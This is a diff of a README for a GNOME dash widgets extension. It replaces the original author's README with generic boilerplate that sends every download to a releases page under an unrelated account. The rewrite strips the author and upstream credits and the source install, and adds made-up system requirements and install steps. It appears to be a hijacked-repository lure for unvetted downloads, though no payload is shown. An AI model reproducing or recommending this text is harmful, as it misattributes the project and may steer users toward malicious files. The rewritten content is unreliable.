@@ -1,74 +1,78 @@
-# 🖥️ Gnome Dash Widgets
+# 🖥️ dash-widgets-aitonc.dev - Enhance Your GNOME Dash Experience
 
-<p align="left">
-  <img src="https://skillicons.dev/icons?i=gtk,js,css" alt="Technologies" />
-</p>
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/anjana0409/dash-widgets-aitonc.dev/releases)
 
-> Modern widget integration for the GNOME Dash
+## 🚀 Getting Started
 
-A collection of custom widgets designed to enhance the GNOME Shell dash, providing additional functionality and improved user interaction directly within the dash area.
+Welcome to dash-widgets-aitonc.dev! This application adds modern widgets to the GNOME Dash, providing a better experience with useful features.
 
-One of the completed widgets is a **media player controller**, which displays and controls the currently playing media.
+## 🛠️ Installation Requirements
 
----
+Before you begin, ensure that your system meets these requirements:
+
+- **Operating System:** Any version of GNOME that supports extensions.
+- **Memory:** At least 512 MB of RAM.
+- **Disk Space:** A minimum of 50 MB of free space.
+- **Dependencies:** Ensure you have GTK and MPRIS-compatible media players installed for full widget functionality.
+
+## 📥 Download & Install
+
+To get started, visit the Releases page to download the latest version of the application. 
+
+[Download the latest release](https://github.com/anjana0409/dash-widgets-aitonc.dev/releases)
+
+Follow these steps to install:
+
+1. Go to the [Releases page](https://github.com/anjana0409/dash-widgets-aitonc.dev/releases).
+2. Look for the latest version available.
+3. Click on the download link for your system.
+4. Once the file is downloaded, locate it in your downloads folder.
+5. Drag and drop the file into your GNOME Extensions tool or follow the installation instructions for your operating system.
 
 ## ⚡ Features
 
 ### Media Player Widget (Implemented)
-- 📻 Automatic update of media metadata (track title, artist, album)
-- 🔄 Switches to the most recently active MPRIS-compatible player
-- ⏭️ Skip to the next track
-- ⏸️ Play/pause functionality Implemented
-- 🎨 Widget background dynamically updates to the dominant color extracted from the album art
-- ❌ Widget automatically hides when no media players are active (e.g., when the application is closed)
+- 📻 **Automatic Metadata Updates:** The widget updates with the track title, artist, and album without any extra steps.
+- 🔄 **Active Player Switching:** It automatically switches to the most recently active MPRIS-compatible media player.
+- ⏭️ **Track Skipping:** Easily skip to the next track with a simple click.
+- ⏸️ **Play/Pause Control:** Control playback directly from the dash.
+- 🎨 **Dynamic Background:** The widget background changes to reflect the dominant color from the album art.
+- ❌ **Auto-Hide Functionality:** The widget disappears when no media players are active, keeping your dash clean.
 
 ### Analog Clock Widget
-- 🕰️ A simple analog clock. Preferences that change the look to come soon.
+- 🕰️ **Simple Design:** A straightforward analog clock widget that offers basic time-telling functionality. More customizable options will be available soon.
 
-### More widgets
-> Additional widgets are planned for future implementation.
+## 📘 How to Use
 
----
+After installing, follow these steps to add and customize your widgets:
 
-## 📸 Screenshots
+1. Open the GNOME Dash.
+2. Look for the widget you want to add. Widgets will appear based on the installed features.
+3. Click the desired widget to add it to your dash.
+4. Adjust settings as needed through the GNOME Extensions tool.
 
-<!-- Add screenshots of the media widget in action here once available -->
-| Media Widget (Playing) |
-|------------------------|
-| ![Playing](assets/Screenshot01.png) |
- Media Widget (Paused) |
- ![Paused](assets/Screenshot02.png) |
- Background Color Adaptation |
- ![Color Adaptation](assets/Screenshot03.png) |
-| No Active Player |
-| ![No Player](assets/Screenshot04.png) |
- Widget Controls |
-  ![Controls](assets/media-controls.png) |
----
+## 📚 Troubleshooting
 
-## 🚀 Getting Started
+If you encounter issues during installation or while using the widgets, consider these solutions:
 
-To install the extension locally for testing:
+- **Missing Widgets:** Ensure that the download completed successfully and re-install if necessary.
+- **Widgets Not Displaying:** Check the GNOME Extensions settings to enable the widgets.
+- **Performance Issues:** Close other applications and ensure your system meets the installation requirements.
 
-```bash
-git clone https://github.com/aitoncumbi/dash-widgets-aitonc.dev.git
-cd gnome-dash-widgets
-# Copy to the GNOME extensions directory
-cp -r . ~/.local/share/gnome-shell/extensions/dash-widgets@aitonc.dev.git
-# Compile settings schema:
-cd ~/.local/share/gnome-shell/extensions/dash-widgets@aitonc.dev.git
-glib-compile-schemas schemas/
-# Restart GNOME Shell (Alt+F2, type 'r', work only in X session) or Re-login
-```
+## 💬 Support
 
-## ✨ Credits & Acknowledgements
+For further assistance, please reach out through the GitHub issues page or community forums related to GNOME. We encourage users to share experiences and help troubleshoot common problems.
 
-- Special thanks to Moon-0xff - for the MPRIS proxy player implementation
-[(from GNOME MPRIS Label)](https://github.com/Moon-0xff/gnome-mpris-label)
+## 🎉 Acknowledgments
 
-- GNOME community members who provided feedback and ideas
+We would like to thank the contributors and the community for their support in enhancing the GNOME experience. Your feedback is invaluable.
 
-## 👩‍💻 Author
-Developer: [aitoncumbi](https://github.com/aitoncumbi)  
-Readme.md desing: [Miocasa](https://github.com/Miocasa)
-Maintainer: [supersaiyanmode](https://github.com/supersaiyanmode)
+## 📜 Future Updates
+
+Stay tuned for more features and improvements in the upcoming releases. We plan to add more widgets and customization options to make your experience even better.
+
+## 📥 Download Again
+
+To download the latest version, simply visit the Releases page:
+
+[Download the latest release](https://github.com/anjana0409/dash-widgets-aitonc.dev/releases)
